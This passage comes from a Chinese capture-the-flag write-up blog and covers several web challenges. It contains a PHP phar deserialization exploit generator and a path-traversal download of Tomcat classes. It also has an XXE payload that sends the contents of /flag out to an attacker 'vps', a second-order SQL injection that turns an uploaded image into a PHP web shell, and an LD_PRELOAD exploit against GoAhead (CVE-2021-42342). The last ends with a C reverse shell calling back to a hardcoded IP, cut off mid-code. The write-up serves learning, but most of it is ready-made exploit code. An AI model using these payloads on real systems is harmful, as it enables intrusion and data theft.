<span class="built_in">parent</span>::__construct(<span class="variable">$path</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream());</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;ameuu.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//触发的头是C1e4r类，所以传入C1e4r对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">copy(<span class="string">&#x27;./ameuu.phar&#x27;</span>,<span class="string">&#x27;ameuu.gif&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h2><ul>
<li>xxe</li>
</ul>
<p>首先是文件上传，随意上传文件，好像没有什么过滤的地方，存在文件下载。一看格式就经典任意文件下载了，查看报错界面是<code>Apache Tomcat/8.5.54</code>，那么直接查看<code>web.xml</code></p>
<p><img src="https://img-blog.csdnimg.cn/53d2790680f14d11b41d5daef9642dbe.png" alt="image-20220624195417391"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=../../../../WEB-INF/web.xml</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dc28450cb73a48ffa178973d465732f9.png" alt="image-20220624195717865"></p>
<p>直接根据路径下载类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://8bf9ae81-9bfd-42d1-8ef0-d90e9518ebb7.node4.buuoj.cn:81/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</span><br><span class="line">../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class</span><br><span class="line">../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class</span><br></pre></td></tr></table></figure>

<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><h5 id="DownloadServlet"><a href="#DownloadServlet" class="headerlink" title="DownloadServlet"></a><code>DownloadServlet</code></h5><p>post传参，一个参数<code>filename</code>，文件名内不允许包含<code>flag</code>字符串，并且会判断文件是否存在 如果存在则将输出字节流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String fileName = request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">    fileName = <span class="keyword">new</span> String(fileName.getBytes(<span class="string">&quot;ISO8859-1&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;filename=&quot;</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> (fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;禁止读取&quot;</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String fileSaveRootPath = getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">    File file = <span class="keyword">new</span> File(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;您要下载的资源已被删除!&quot;</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String realname = fileName.substring(fileName.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    FileInputStream in = <span class="keyword">new</span> FileInputStream(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">    ServletOutputStream out = response.getOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">      out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">    in.close();</span><br><span class="line">    out.close();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">    <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    String dir = saveRootPath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">    File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists())</span><br><span class="line">      file.mkdirs(); </span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ListFileServlet"><a href="#ListFileServlet" class="headerlink" title="ListFileServlet"></a><code>ListFileServlet</code></h5><p>存在<code>saveFilename</code>和<code>filename</code>两个参数，但是并没有什么可利用的地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListFileServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String uploadFilePath = getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    Map&lt;String, String&gt; fileNameMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    String saveFilename = (String)request.getAttribute(<span class="string">&quot;saveFilename&quot;</span>);</span><br><span class="line">    String filename = (String)request.getAttribute(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;saveFilename&quot;</span> + saveFilename);</span><br><span class="line">    System.out.println(<span class="string">&quot;filename&quot;</span> + filename);</span><br><span class="line">    String realName = saveFilename.substring(saveFilename.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    fileNameMap.put(saveFilename, filename);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;fileNameMap&quot;</span>, fileNameMap);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/listfile.jsp&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="UploadServlet"><a href="#UploadServlet" class="headerlink" title="UploadServlet"></a><code>UploadServlet</code></h5><p>文件上传操作，存在报错<code>poi-ooxml-3.10 has something wrong</code>hint！ &gt;&gt; <a href="https://www.jianshu.com/p/73cd11d83c30">Apache POI XML外部实体（XML External Entity，XXE）攻击详解 - 简书 (jianshu.com)</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String savePath = getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    String tempPath = getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/temp&quot;</span>);</span><br><span class="line">    File tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">    <span class="keyword">if</span> (!tempFile.exists())</span><br><span class="line">      tempFile.mkdir(); </span><br><span class="line">    String message = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">      factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">      factory.setRepository(tempFile);</span><br><span class="line">      ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload((FileItemFactory)factory);</span><br><span class="line">      upload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">      upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">      upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">      <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request))</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">      List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">      <span class="keyword">for</span> (FileItem fileItem : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">          String name = fileItem.getFieldName();</span><br><span class="line">          String str = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        String filename = fileItem.getName();</span><br><span class="line">        <span class="keyword">if</span> (filename == <span class="keyword">null</span> || filename.trim().equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">          <span class="keyword">continue</span>; </span><br><span class="line">        String fileExtName = filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        InputStream in = fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">            Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;  </span><br><span class="line">        String saveFilename = makeFileName(filename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;saveFilename&quot;</span>, saveFilename);</span><br><span class="line">        request.setAttribute(<span class="string">&quot;filename&quot;</span>, filename);</span><br><span class="line">        String realSavePath = makePath(saveFilename, savePath);</span><br><span class="line">        FileOutputStream out = <span class="keyword">new</span> FileOutputStream(realSavePath + <span class="string">&quot;/&quot;</span> + saveFilename);</span><br><span class="line">        <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">          out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">        in.close();</span><br><span class="line">        out.close();</span><br><span class="line">        message = <span class="string">&quot;文件上传成功!&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileUploadException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    request.setAttribute(<span class="string">&quot;message&quot;</span>, message);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/ListFileServlet&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">private</span> String <span class="title">makeFileName</span><span class="params">(String filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> UUID.randomUUID().toString() + <span class="string">&quot;_&quot;</span> + filename;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">private</span> String <span class="title">makePath</span><span class="params">(String filename, String savePath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">    <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    String dir = savePath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">    File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists())</span><br><span class="line">      file.mkdirs(); </span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h3><p>新建一个xlsx文件并解压（建议在linux环境下解压和压缩</p>
<p>在<code>[Content_Types].xml</code>第二行插入xxe payload</p>
<p>测试：（在vps上监听，可以获取到ack信息</p>
<p><a href="https://www.jianshu.com/p/73cd11d83c30">Apache POI XML外部实体（XML External Entity，XXE）攻击详解 - 简书 (jianshu.com)</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://vps:3000/ack&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/1578e95334c4465399e19e121d589daf.png" alt="image-20220625185626131"></p>
<p><a href="https://blog.csdn.net/m0_49835838/article/details/122718372">https://blog.csdn.net/m0_49835838/article/details/122718372</a></p>
<p>payload：</p>
<p><code>[Content_Types].xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&#x27;http://vps/ameuu.dtd&#x27;</span>&gt;</span> %test; %exe; %entity;]&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>ameuu.dtd</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">exe</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; entity SYSTEM &#x27;http://vps/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以在日志文件里可以找到flag</p>
<p><img src="https://img-blog.csdnimg.cn/21ed885db5a043e5aeaa049021a058a0.png" alt="image-20220625192258429"></p>
<h2 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h2><ul>
<li>信息泄露</li>
<li>update 注入</li>
<li>二次注入</li>
</ul>
<p><code>www.tar.gz</code></p>
<h4 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h4><p><code>index.php</code>中没有太多有用的信息，而<code>common.inc.php</code>中数据库信息且利用php连接数据库，同时将GET、POST、COOKIE数组中的值的特殊符号进行转义</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$req</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>, <span class="variable">$_COOKIE</span>) <span class="keyword">as</span> <span class="variable">$global_var</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$global_var</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		is_string(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$req</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>upload.php</code></p>
<p>规定了后缀名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;txt&quot;</span>))) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">&quot;error extension&quot;</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>sql查询之前对文件名进行转义，在后续的插入信息中也会影响，就会很难利用sql注入，如果上传成功则将文件目录输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>] = addslashes(<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27; and `extension`=&#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>插入的时候保存的文件名不包括后缀名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27;, 0, &#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>rename.php</code></p>
<p>会先判断文件是否存在，如果存在则继续</p>
<p>关键代码：这里我们可以发现<code>oldname</code>对应的值并不会被转义，也就是说我们一开始传入的文件在搜索到之后会以原来的形式出现（造成了二次注入，并且会在后面判断文件是否存在，如果存在就重命名</p>
<p>那么注入点就是在这里了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = basename(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]); <span class="comment">// shell.jpg &#x27;,extension=&#x27; shell.php</span></span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line">	print_r(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$oldname</span> = UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"><span class="variable">$newname</span> = UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>]; <span class="comment">// shell.jpg.jpg</span></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">	rename(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="做题："><a href="#做题：" class="headerlink" title="做题："></a>做题：</h4><p>关键payload：<code>&#39;,extension=&#39;</code></p>
<p>新建一个空文件，文件名为<code>&#39;,extension=&#39;.jpg</code></p>
<p>上传成功之后在<code>rename</code>处将<code>&#39;,extension=&#39;</code>修改成<code>shell.jpg</code>，因为rename一开始查询文件信息的时候得到<code>$result</code>，并且数据被拿出来的时候并不会被转义所以<code>$result[&#39;filename&#39;]=&#39;,extension=&#39;</code>，导致在之后的update语句中实现了sql注入，更新的内容变成：</p>
<table>
<thead>
<tr>
<th>fid</th>
<th>newname</th>
<th>oldname</th>
<th>extension</th>
</tr>
</thead>
<tbody><tr>
<td>？</td>
<td>shell.jpg</td>
<td>null</td>
<td>null</td>
</tr>
</tbody></table>
<p>但这只是修改了数据库的内容，在后续的<code>file_exists</code>还是会检测到<code>&#39;,extension=&#39;.jpg</code>文件存在，实现文件名改成了<code>shell.jpg.jpg</code></p>
<p>创建一个图片马，文件名为<code>shell.jpg</code>，上传成功后将<code>shell.jpg</code>改成<code>shell.php</code>，因为在rename的时候直接查询<code>shell.jpg</code>是能够查到东西的，也就是上面所列出来的表，并且<code>$resulr[&#39;extension&#39;]=&#39;&#39;</code>，所以在后面执行<code>rename</code>函数的之后执行为=&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename(&#x27;shell.jpg&#x27;,&#x27;shell.php&#x27;)</span><br></pre></td></tr></table></figure>

<p>成功完成了修改，访问<code>shell.php</code>命令执行</p>
<h2 id="ACTF-2022-gogogo"><a href="#ACTF-2022-gogogo" class="headerlink" title="[ACTF 2022]gogogo"></a>[ACTF 2022]gogogo</h2><ul>
<li>goahead</li>
<li>cve-2021-42342</li>
</ul>
<p><a href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html</a></p>
<p><a href="https://paper.seebug.org/1808/#_5">https://paper.seebug.org/1808/#_5</a></p>
<p><a href="https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg">https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg</a></p>
<h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><p>直接在url上get请求LD_PRELOAD=test，可以发现env页面出现了<code>CGI_LD_PRELOAD=test</code>说明存在漏洞直接根据P神的博客按顺序打就好了</p>
<p>python上传文件：（上传之后需要修改Content-Length并在文件内容后面加上2000个脏字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &#x27;http://82.156.2.166:10218/cgi-bin/hello&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://123.60.84.229:10218/cgi-bin/hello&#x27;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">     data = f.read()</span><br><span class="line"> files = &#123;<span class="string">&#x27;file&#x27;</span>: data&#125;</span><br><span class="line"><span class="comment"># print(files)</span></span><br><span class="line"><span class="comment"># boundary = &#x27;----%s&#x27; % str(random.randint(1000000000000, 9999999999999))</span></span><br><span class="line"><span class="comment"># padding = &#x27;a&#x27; * 2000</span></span><br><span class="line"><span class="comment"># data = fr&#x27;&#x27;&#x27;POST /cgi-bin/hello HTTP/1.1</span></span><br><span class="line"><span class="comment"># Host: 82.156.2.166:10218</span></span><br><span class="line"><span class="comment"># Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment"># Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment"># Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span></span><br><span class="line"><span class="comment"># Connection: close</span></span><br><span class="line"><span class="comment"># Content-Type: multipart/form-data; boundary=&#123;boundary&#125;</span></span><br><span class="line"><span class="comment"># Content-Length: 15000</span></span><br><span class="line"><span class="comment"># --&#123;boundary&#125;</span></span><br><span class="line"><span class="comment"># Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;;\</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># /proc/self/fd/7</span></span><br><span class="line"><span class="comment"># --&#123;boundary&#125;</span></span><br><span class="line"><span class="comment"># Content-Disposition: form-data; name=&quot;data&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment"># Content-Type: text/plain\</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># #payload#&#123;padding&#125;</span></span><br><span class="line"><span class="comment"># --&#123;boundary&#125;--</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;.replace(&#x27;\n&#x27;, &#x27;\r\n&#x27;)</span></span><br><span class="line"></span><br><span class="line"> r = requests.post(url, files=files)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/546367d4826a4801b72b8ce4b997a8f6.png" alt="image-20220625115827348"></p>
<p><img src="https://img-blog.csdnimg.cn/aa0de79d881044818a864151564c45a0.png" alt="image-20220625144058604"></p>
<p>没什么好说的，直接按照P神步骤来，但是这里的<code>LD_PRELOAD</code>指向的文件还是要自己手动找一下并不是固定的，导致P神给的脚本并不通用</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *server_ip=<span class="string">&quot;82.156.2.166&quot;</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> server_port=<span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">(<span class="keyword">void</span>)</span> 